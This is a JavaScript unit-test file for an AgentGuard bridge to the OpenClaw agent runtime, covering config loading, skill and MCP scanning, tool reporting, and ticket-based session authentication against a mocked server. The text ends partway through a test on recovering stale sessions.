"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");

const { AgentGuardOpenClawBridge } = require("./bridge.cjs");
const {
  BasePlugin,
  CheckResult,
  EventType,
  GuardDecision,
} = require("./agentguard-runtime.cjs");

function buildPhases(overrides = {}) {
  return {
    llm_before: { client: [], server: [] },
    llm_after: { client: [], server: [] },
    tool_before: { client: [], server: [] },
    tool_after: { client: [], server: [] },
    ...overrides,
  };
}

function buildToolContext(overrides = {}) {
  return {
    agentId: "agent-main",
    sessionId: "session-1",
    sessionKey: "agent:main:session-1",
    runId: "run-1",
    toolName: "send_http",
    toolCallId: "tool-call-1",
    channelId: "cli",
    ...overrides,
  };
}

function buildAgentContext(overrides = {}) {
  return {
    agentId: "agent-main",
    sessionId: "session-1",
    sessionKey: "agent:main:session-1",
    runId: "run-1",
    channelId: "cli",
    ...overrides,
  };
}

function writeFile(filePath, content) {
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, content);
}

test("configPath loads AgentGuard config from an external JSON file", async () => {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-"));
  const configPath = path.join(configDir, "agentguard-config.json");
  const toolCatalogPath = path.join(configDir, "openclaw-tools.json");
  const sharedPhaseConfig = JSON.parse(
    fs.readFileSync(path.resolve(__dirname, "../../../../../../../../config/plugins.json"), "utf8"),
  );
  fs.writeFileSync(
    toolCatalogPath,
    JSON.stringify({
      tools: [
        {
          name: "custom_tool",
          description: "Custom tool catalog entry.",
          input_params: ["subject", "body"],
        },
      ],
    }),
  );
  fs.writeFileSync(
    configPath,
    JSON.stringify({
      auditPath: "./tmp/agentguard-openclaw-audit-test.jsonl",
      defaultToolCatalogPath: "./openclaw-tools.json",
    }),
  );

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: { configPath },
  });

  const result = await bridge.runBeforeToolCall({
    ctx: buildToolContext(),
    event: {
      toolName: "exec",
      params: { command: "echo ok" },
    },
  });

  assert.equal(result, undefined);
  assert.equal(bridge.config.auditPath, "./tmp/agentguard-openclaw-audit-test.jsonl");
  assert.deepEqual(bridge.config.phases, sharedPhaseConfig.phases);
  assert.deepEqual(bridge.config.defaultTools, [
    {
      name: "custom_tool",
      description: "Custom tool catalog entry.",
      input_params: ["subject", "body"],
      capabilities: [],
      metadata: {},
    },
  ]);
});

test("skillScan config scans configured skill roots into bridge state", () => {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-skill-scan-"));
  const configPath = path.join(configDir, "agentguard-config.json");
  const toolCatalogPath = path.join(configDir, "openclaw-tools.json");
  const skillDir = path.join(configDir, "skills", "demo-skill");
  writeFile(
    path.join(skillDir, "SKILL.md"),
    [
      "---",
      "name: demo-skill",
      "description: Demo skill from bridge config.",
      "---",
      "# Demo Skill",
      "",
      "Use this skill for bridge scanner tests.",
    ].join("\n"),
  );
  writeFile(path.join(skillDir, "prompt.md"), "Prompt content.");
  writeFile(path.join(skillDir, "scripts", "run.py"), "print('hello')\n");
  writeFile(path.join(skillDir, "assets", "note.txt"), "asset text");
  fs.writeFileSync(
    toolCatalogPath,
    JSON.stringify({
      tools: [
        {
          name: "custom_tool",
          description: "Custom tool catalog entry.",
        },
      ],
    }),
  );
  fs.writeFileSync(
    configPath,
    JSON.stringify({
      phases: buildPhases(),
      defaultToolCatalogPath: "./openclaw-tools.json",
      skillScan: {
        enabled: true,
        roots: ["./skills"],
      },
    }),
  );

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: { configPath },
  });
  const state = bridge.getState(buildToolContext());
  const descriptor = state.skillScan.skills[0];

  assert.equal(bridge.config.skillScan.enabled, true);
  assert.deepEqual(bridge.config.skillScan.roots, [path.join(configDir, "skills")]);
  assert.equal(state.skillScan.summary.skill_count, 1);
  assert.equal(descriptor.name, "demo-skill");
  assert.equal(descriptor.description, "Demo skill from bridge config.");
  assert.match(descriptor.skill_markdown.content, /Use this skill/);
  assert.equal(descriptor.files.some((file) => file.relative_path === "prompt.md" && file.kind === "prompt"), true);
  assert.equal(descriptor.files.some((file) => file.relative_path === "scripts/run.py" && file.kind === "script"), true);
  assert.equal(descriptor.files.some((file) => file.relative_path === "assets/note.txt" && file.kind === "text"), true);
  assert.equal(state.context.metadata.skill_scan.skill_count, 1);
  assert.equal(state.context.metadata.skill_scan.skills[0].name, "demo-skill");
  assert.equal(Object.prototype.hasOwnProperty.call(state.context.metadata.skill_scan.skills[0], "files"), false);
});

test("skillScan can be enabled without roots and reports a local diagnostic", () => {
  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases(),
      skillScan: {
        enabled: true,
      },
    },
  });
  const state = bridge.getState(buildToolContext());

  assert.equal(state.skillScan.summary.skill_count, 0);
  assert.equal(state.skillScan.diagnostics[0].reason, "no_skill_scan_roots");
  assert.equal(state.context.metadata.skill_scan.enabled, true);
  assert.equal(state.context.metadata.skill_scan.diagnostic_count, 1);
});

test("mcpScan config scans configured MCP servers into bridge state", () => {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-mcp-scan-"));
  const configPath = path.join(configDir, "agentguard-config.json");
  const toolCatalogPath = path.join(configDir, "openclaw-tools.json");
  const serverDir = path.join(configDir, "mcp-server");
  writeFile(
    path.join(serverDir, "package.json"),
    JSON.stringify({
      name: "demo-mcp-server",
      type: "module",
    }),
  );
  writeFile(
    path.join(serverDir, "src", "server.js"),
    [
      "import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';",
      "import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';",
      "const server = new McpServer({ name: 'demo', version: '1.0.0' });",
      "server.tool('read_file', 'Read files', {}, async () => ({}));",
      "await server.connect(new StdioServerTransport());",
    ].join("\n"),
  );
  writeFile(
    path.join(configDir, ".cursor", "mcp.json"),
    JSON.stringify({
      mcpServers: {
        local_mcp: {
          command: "node",
          args: ["./src/server.js"],
          cwd: "./mcp-server",
          tools: [
            {
              name: "read_file",
              description: "Read files",
              inputSchema: { type: "object" },
            },
          ],
        },
        remote_mcp: {
          transport: "streamable-http",
          url: "https://mcp.example/mcp",
        },
      },
    }),
  );
  fs.writeFileSync(
    toolCatalogPath,
    JSON.stringify({
      tools: [
        {
          name: "custom_tool",
          description: "Custom tool catalog entry.",
        },
      ],
    }),
  );
  fs.writeFileSync(
    configPath,
    JSON.stringify({
      phases: buildPhases(),
      defaultToolCatalogPath: "./openclaw-tools.json",
      mcpScan: {
        enabled: true,
        roots: ["."],
      },
    }),
  );

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: { configPath },
  });
  const state = bridge.getState(buildToolContext());
  const byName = Object.fromEntries(state.mcpScan.mcps.map((mcp) => [mcp.name, mcp]));

  assert.equal(bridge.config.mcpScan.enabled, true);
  assert.deepEqual(bridge.config.mcpScan.roots, [configDir]);
  assert.equal(state.mcpScan.summary.mcp_count, 2);
  assert.equal(byName.local_mcp.source_status, "source_recovered");
  assert.equal(byName.local_mcp.transport, "stdio");
  assert.equal(byName.local_mcp.tool_count, 1);
  assert.equal(byName.local_mcp.extraction.sdk_detected, true);
  assert.equal(byName.local_mcp.files.some((file) => file.relative_path === "src/server.js"), true);
  assert.match(
    byName.local_mcp.files.find((file) => file.relative_path === "src/server.js").content,
    /McpServer/,
  );
  assert.equal(byName.remote_mcp.remote, true);
  assert.equal(byName.remote_mcp.source_status, "remote_source_unavailable");
  assert.equal(state.context.metadata.mcp_scan.mcp_count, 2);
  assert.equal(state.context.metadata.mcp_scan.mcps[0].name, "local_mcp");
  assert.equal(Object.prototype.hasOwnProperty.call(state.context.metadata.mcp_scan.mcps[0], "files"), false);
});

test("mcpScan can be enabled without sources and reports a local diagnostic", () => {
  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases(),
      mcpScan: {
        enabled: true,
      },
    },
  });
  const state = bridge.getState(buildToolContext());

  assert.equal(state.mcpScan.summary.mcp_count, 0);
  assert.equal(state.mcpScan.diagnostics[0].reason, "no_mcp_scan_sources");
  assert.equal(state.context.metadata.mcp_scan.enabled, true);
  assert.equal(state.context.metadata.mcp_scan.diagnostic_count, 1);
});

test("remote-enabled sessions auto-register and report default OpenClaw tools", async () => {
  const originalFetch = globalThis.fetch;
  const calls = [];
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    calls.push({
      url: String(url),
      body: options.body ? JSON.parse(options.body) : null,
    });
    return {
      ok: true,
      async json() {
        return {};
      },
    };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        phases: buildPhases(),
      },
    });

    const state = bridge.getState(buildToolContext());
    await bridge.ensureDefaultToolReports(state);

    const registerCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/register"));
    const toolCalls = calls.filter((call) => call.url.endsWith("/v1/server/tools/report"));

    assert.equal(registerCalls.length, 1);
    assert.ok(String(registerCalls[0].body.context.metadata.client_config_url || "").endsWith("/v1/client/plugins/config"));
    assert.ok(String(registerCalls[0].body.context.metadata.client_plugin_list_url || "").endsWith("/v1/client/plugins/list"));
    assert.ok(String(registerCalls[0].body.context.metadata.client_health_url || "").endsWith("/v1/client/health"));
    assert.deepEqual(registerCalls[0].body.context.metadata.client_plugin_config, {
      phases: buildPhases(),
    });
    assert.deepEqual(registerCalls[0].body.context.metadata.remote_plugin_config, {
      phases: buildPhases(),
    });
    assert.equal(toolCalls.length >= 10, true);
    const byName = Object.fromEntries(toolCalls.map((call) => [call.body.tool.name, call.body.tool]));
    assert.deepEqual(byName.read.input_params, ["path", "offset", "limit"]);
    assert.deepEqual(byName.exec.input_params, [
      "command",
      "workdir",
      "env",
      "yieldMs",
      "background",
      "timeout",
      "pty",
      "elevated",
      "host",
      "security",
      "ask",
      "node",
    ]);
    assert.deepEqual(byName.web_search.input_params, [
      "query",
      "count",
      "country",
      "language",
      "freshness",
      "date_after",
      "date_before",
      "search_lang",
      "ui_lang",
      "domain_filter",
      "max_tokens",
      "max_tokens_per_page",
    ]);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
  }
});

test("ticket-enabled sessions create OpenClaw runtime auth and skip legacy registration", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  const calls = [];
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    const body = options.body ? JSON.parse(options.body) : null;
    calls.push({
      url: String(url),
      headers: { ...(options.headers || {}) },
      body,
    });
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            ticket_prefix: "agt-ticket",
            agents: [
              {
                external_agent_id: "agent-main",
                agent_id: "ag_openclaw_1",
                agent_identity_code: "agic_openclaw_1",
                public_key_thumbprint: "thumb-openclaw-1",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/session/create")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            session_id: "ags_openclaw_1",
            agent_id: "ag_openclaw_1",
            user_id: "user-7",
            session_token: "runtime-token-openclaw",
            expires_at: Math.floor(Date.now() / 1000) + 600,
          };
        },
      };
    }
    return {
      ok: true,
      async json() {
        return {};
      },
    };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        openclawConfigPath: path.join(keyDir, "missing-openclaw.json"),
        phases: buildPhases(),
      },
    });

    const state = bridge.getState(buildToolContext());
    await bridge.ensureDefaultToolReports(state);

    const bootstrapCalls = calls.filter((call) => call.url.endsWith("/v1/server/agents/bootstrap"));
    const createCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/create"));
    const registerCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/register"));
    const toolCalls = calls.filter((call) => call.url.endsWith("/v1/server/tools/report"));

    assert.equal(bootstrapCalls.length, 1);
    assert.equal(bootstrapCalls[0].body.provider, "openclaw");
    assert.equal(bootstrapCalls[0].body.user_ticket, "agt-ticket-openclaw");
    assert.equal(bootstrapCalls[0].body.agents.some((agent) => agent.external_agent_id === "agent-main"), true);
    assert.equal(createCalls.length, 1);
    assert.equal(registerCalls.length, 0);
    assert.equal(createCalls[0].body.provider, "openclaw");
    assert.equal(createCalls[0].body.agent_id, "ag_openclaw_1");
    assert.equal(createCalls[0].body.external_session_id, "session-1");
    assert.equal(createCalls[0].body.user_ticket, undefined);
    assert.equal(createCalls[0].body.metadata.openclaw_agent_id, "agent-main");
    assert.equal(createCalls[0].body.metadata.openclaw_session_id, "session-1");
    assert.equal(createCalls[0].body.metadata.openclaw_session_key, "agent:main:session-1");
    assert.equal(createCalls[0].body.metadata.client_session_key, "agent:main:session-1");
    assert.ok(String(createCalls[0].body.metadata.client_config_url || "").endsWith("/v1/client/plugins/config"));
    assert.ok(String(createCalls[0].body.metadata.client_health_url || "").endsWith("/v1/client/health"));
    assert.ok(createCalls[0].headers.DPoP);
    assert.ok(createCalls[0].headers["X-AgentGuard-Agent-Proof"]);
    assert.equal(createCalls[0].headers["X-AgentGuard-Session-Id"], undefined);
    assert.equal(toolCalls.length >= 10, true);
    assert.equal(toolCalls[0].headers.Authorization, "DPoP runtime-token-openclaw");
    assert.ok(toolCalls[0].headers.DPoP);
    assert.equal(toolCalls[0].headers["X-AgentGuard-Session-Id"], undefined);
    assert.equal(toolCalls[0].body.context.session_id, "ags_openclaw_1");
    assert.equal(toolCalls[0].body.context.agent_id, "ag_openclaw_1");
    assert.equal(toolCalls[0].body.context.user_id, "user-7");
    assert.equal(toolCalls[0].body.context.metadata.agentguard_session_id, "ags_openclaw_1");
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("ticket-enabled sessions map multiple OpenClaw sessions to one canonical agent", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  const calls = [];
  let createCount = 0;
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    const body = options.body ? JSON.parse(options.body) : null;
    calls.push({ url: String(url), headers: { ...(options.headers || {}) }, body });
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            agents: [
              {
                external_agent_id: "agent-main",
                agent_id: "ag_openclaw_canonical",
                agent_identity_code: "agic_openclaw_canonical",
                public_key_thumbprint: "thumb-openclaw-canonical",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/session/create")) {
      createCount += 1;
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            session_id: `ags_openclaw_${createCount}`,
            agent_id: "ag_openclaw_canonical",
            user_id: "user-7",
            session_token: `runtime-token-openclaw-${createCount}`,
            expires_at: Math.floor(Date.now() / 1000) + 600,
          };
        },
      };
    }
    return { ok: true, async json() { return {}; } };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
    });

    await bridge.ensureDefaultToolReports(bridge.getState(buildToolContext({
      sessionId: "session-1",
      sessionKey: "agent:agent-main:session-1",
    })));
    await bridge.ensureDefaultToolReports(bridge.getState(buildToolContext({
      sessionId: "session-2",
      sessionKey: "agent:agent-main:session-2",
    })));

    const bootstrapCalls = calls.filter((call) => call.url.endsWith("/v1/server/agents/bootstrap"));
    const createCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/create"));
    assert.equal(bootstrapCalls.length, 1);
    assert.equal(createCalls.length, 2);
    assert.deepEqual(createCalls.map((call) => call.body.agent_id), [
      "ag_openclaw_canonical",
      "ag_openclaw_canonical",
    ]);
    assert.deepEqual(createCalls.map((call) => call.body.external_session_id), [
      "session-1",
      "session-2",
    ]);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("ticket-enabled sessions create a new runtime session when OpenClaw sessionId changes", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  const calls = [];
  let createCount = 0;
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    const body = options.body ? JSON.parse(options.body) : null;
    calls.push({ url: String(url), headers: { ...(options.headers || {}) }, body });
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            agents: [
              {
                external_agent_id: "agent-main",
                agent_id: "ag_openclaw_canonical",
                agent_identity_code: "agic_openclaw_canonical",
                public_key_thumbprint: "thumb-openclaw-canonical",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/session/create")) {
      createCount += 1;
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            session_id: `ags_openclaw_${createCount}`,
            agent_id: "ag_openclaw_canonical",
            user_id: "user-7",
            session_token: `runtime-token-openclaw-${createCount}`,
            expires_at: Math.floor(Date.now() / 1000) + 600,
          };
        },
      };
    }
    return { ok: true, async json() { return {}; } };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
    });

    const first = bridge.getState(buildToolContext({
      sessionId: "openclaw-session-1",
      sessionKey: "agent:agent-main:main",
    }));
    await bridge.ensureRuntimeAuth(first);
    const second = bridge.getState(buildToolContext({
      sessionId: "openclaw-session-2",
      sessionKey: "agent:agent-main:main",
    }));
    await bridge.ensureRuntimeAuth(second);

    const createCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/create"));
    assert.equal(createCalls.length, 2);
    assert.deepEqual(createCalls.map((call) => call.body.agent_id), [
      "ag_openclaw_canonical",
      "ag_openclaw_canonical",
    ]);
    assert.deepEqual(createCalls.map((call) => call.body.external_session_id), [
      "openclaw-session-1",
      "openclaw-session-2",
    ]);
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("ticket-enabled sessions read the real OpenClaw sessionId from the session store", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-session-store-"));
  const storePath = path.join(configDir, "sessions.json");
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  fs.writeFileSync(
    storePath,
    JSON.stringify({
      "agent:agent-main:main": {
        sessionId: "openclaw-real-session-1",
        updatedAt: Date.now(),
      },
    }),
  );
  const calls = [];
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    const body = options.body ? JSON.parse(options.body) : null;
    calls.push({ url: String(url), headers: { ...(options.headers || {}) }, body });
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            agents: [
              {
                external_agent_id: "agent-main",
                agent_id: "ag_openclaw_canonical",
                agent_identity_code: "agic_openclaw_canonical",
                public_key_thumbprint: "thumb-openclaw-canonical",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/session/create")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            session_id: "ags_openclaw_1",
            agent_id: "ag_openclaw_canonical",
            user_id: "user-7",
            session_token: "runtime-token-openclaw",
            expires_at: Math.floor(Date.now() / 1000) + 600,
          };
        },
      };
    }
    return { ok: true, async json() { return {}; } };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
      openclawRuntime: {
        config: {
          loadConfig() {
            return { session: { store: storePath } };
          },
        },
        channel: {
          session: {
            resolveStorePath(store) {
              return store;
            },
          },
        },
      },
    });

    const state = bridge.getState(buildToolContext({
      sessionId: undefined,
      sessionKey: "agent:agent-main:main",
    }));
    await bridge.ensureRuntimeAuth(state);

    const createCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/create"));
    assert.equal(createCalls.length, 1);
    assert.equal(state.context.metadata.openclaw.sessionId, "openclaw-real-session-1");
    assert.equal(createCalls[0].body.external_session_id, "openclaw-real-session-1");
    assert.equal(createCalls[0].body.metadata.openclaw_session_id, "openclaw-real-session-1");
    assert.equal(createCalls[0].body.metadata.openclaw_session_key, "agent:agent-main:main");
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("ticket-enabled sessions create a new runtime session when the stored OpenClaw sessionId changes", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-session-store-change-"));
  const storePath = path.join(configDir, "sessions.json");
  const sessionKey = "agent:agent-main:main";
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  const writeStoreSession = (sessionId) => fs.writeFileSync(
    storePath,
    JSON.stringify({
      [sessionKey]: {
        sessionId,
        updatedAt: Date.now(),
      },
    }),
  );
  writeStoreSession("openclaw-real-session-1");
  const calls = [];
  let createCount = 0;
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    const body = options.body ? JSON.parse(options.body) : null;
    calls.push({ url: String(url), headers: { ...(options.headers || {}) }, body });
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            agents: [
              {
                external_agent_id: "agent-main",
                agent_id: "ag_openclaw_canonical",
                agent_identity_code: "agic_openclaw_canonical",
                public_key_thumbprint: "thumb-openclaw-canonical",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/session/create")) {
      createCount += 1;
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            session_id: `ags_openclaw_${createCount}`,
            agent_id: "ag_openclaw_canonical",
            user_id: "user-7",
            session_token: `runtime-token-openclaw-${createCount}`,
            expires_at: Math.floor(Date.now() / 1000) + 600,
          };
        },
      };
    }
    return { ok: true, async json() { return {}; } };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
      openclawRuntime: {
        config: {
          loadConfig() {
            return { session: { store: storePath } };
          },
        },
        channel: {
          session: {
            resolveStorePath(store) {
              return store;
            },
          },
        },
      },
    });

    const first = bridge.getState(buildToolContext({ sessionId: undefined, sessionKey }));
    await bridge.ensureRuntimeAuth(first);
    assert.equal(first.runtimeAuth.external_session_id, "openclaw-real-session-1");

    writeStoreSession("openclaw-real-session-2");
    const second = bridge.getState(buildToolContext({ sessionId: undefined, sessionKey }));
    await bridge.ensureRuntimeAuth(second);

    const createCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/create"));
    assert.equal(first, second);
    assert.equal(createCalls.length, 2);
    assert.deepEqual(createCalls.map((call) => call.body.external_session_id), [
      "openclaw-real-session-1",
      "openclaw-real-session-2",
    ]);
    assert.equal(second.context.metadata.openclaw.sessionId, "openclaw-real-session-2");
    assert.equal(second.runtimeAuth.external_session_id, "openclaw-real-session-2");
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("ticket-enabled bootstrap does not register unknown context ids when catalog exists", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  const calls = [];
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    const body = options.body ? JSON.parse(options.body) : null;
    calls.push({ url: String(url), headers: { ...(options.headers || {}) }, body });
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            agents: [
              {
                external_agent_id: "agent-main",
                agent_id: "ag_openclaw_main",
                agent_identity_code: "agic_openclaw_main",
                public_key_thumbprint: "thumb-openclaw-main",
                user_bound: true,
              },
              {
                external_agent_id: "agentguard-emailcase",
                agent_id: "ag_openclaw_email",
                agent_identity_code: "agic_openclaw_email",
                public_key_thumbprint: "thumb-openclaw-email",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    return { ok: true, async json() { return {}; } };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
      openclawRuntime: {
        listAgents() {
          return [
            { id: "main", name: "main" },
            { id: "agentguard-emailcase", name: "agentguard-emailcase" },
          ];
        },
      },
    });

    const state = bridge.getState(buildToolContext({
      agentId: "not-in-openclaw-catalog",
      sessionKey: "agent:main:session-1",
    }));
    const registration = await bridge.ensureAgentBootstrap(state);

    const bootstrapCalls = calls.filter((call) => call.url.endsWith("/v1/server/agents/bootstrap"));
    assert.equal(registration, undefined);
    assert.equal(bootstrapCalls.length, 1);
    assert.deepEqual(
      bootstrapCalls[0].body.agents.map((agent) => agent.external_agent_id),
      ["main", "agentguard-emailcase"],
    );
    assert.equal(
      bootstrapCalls[0].body.agents.some((agent) => agent.external_agent_id === "not-in-openclaw-catalog"),
      false,
    );
  } finally {
    bridge?.clearAll();
    globalThis.fetch = originalFetch;
    if (originalAgentKeyDir === undefined) {
      delete process.env.AGENTGUARD_AGENT_KEY_DIR;
    } else {
      process.env.AGENTGUARD_AGENT_KEY_DIR = originalAgentKeyDir;
    }
  }
});

test("ticket-enabled sessions recover from stale closed runtime auth sessions", async () => {
  const originalFetch = globalThis.fetch;
  const originalAgentKeyDir = process.env.AGENTGUARD_AGENT_KEY_DIR;
  const keyDir = fs.mkdtempSync(path.join(os.tmpdir(), "agentguard-openclaw-keys-"));
  process.env.AGENTGUARD_AGENT_KEY_DIR = keyDir;
  const calls = [];
  let bridge = null;
  globalThis.fetch = async (url, options = {}) => {
    const body = options.body ? JSON.parse(options.body) : null;
    calls.push({ url: String(url), headers: { ...(options.headers || {}) }, body });
    if (String(url).endsWith("/v1/server/session/refresh")) {
      return {
        ok: false,
        status: 401,
        async json() {
          return { detail: "runtime session is not active" };
        },
      };
    }
    if (String(url).endsWith("/v1/server/agents/bootstrap")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            provider: "openclaw",
            user_id: "user-7",
            agents: [
              {
                external_agent_id: "agent-main",
                agent_id: "ag_openclaw_recovered",
                agent_identity_code: "agic_openclaw_recovered",
                public_key_thumbprint: "thumb-openclaw-recovered",
                user_bound: true,
              },
            ],
          };
        },
      };
    }
    if (String(url).endsWith("/v1/server/session/create")) {
      return {
        ok: true,
        async json() {
          return {
            status: "ok",
            session_id: "ags_openclaw_recovered",
            agent_id: "ag_openclaw_recovered",
            user_id: "user-7",
            session_token: "runtime-token-openclaw-recovered",
            expires_at: Math.floor(Date.now() / 1000) + 600,
          };
        },
      };
    }
    return { ok: true, async json() { return {}; } };
  };

  try {
    bridge = new AgentGuardOpenClawBridge({
      pluginConfig: {
        serverUrl: "http://server.test",
        userTicket: "agt-ticket-openclaw",
        phases: buildPhases(),
      },
    });
    const state = bridge.getState(buildToolContext());
    state.runtimeAuth.session_id = "ags_openclaw_old_closed";
    state.runtimeAuth.agent_id = "ag_old_runtime_agent";
    state.runtimeAuth.user_id = "user-7";
    state.runtimeAuth.session_token = "runtime-token-old-closed";
    state.runtimeAuth.expires_at = 1;

    await bridge.ensureDefaultToolReports(state);

    const refreshCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/refresh"));
    const createCalls = calls.filter((call) => call.url.endsWith("/v1/server/session/create"));
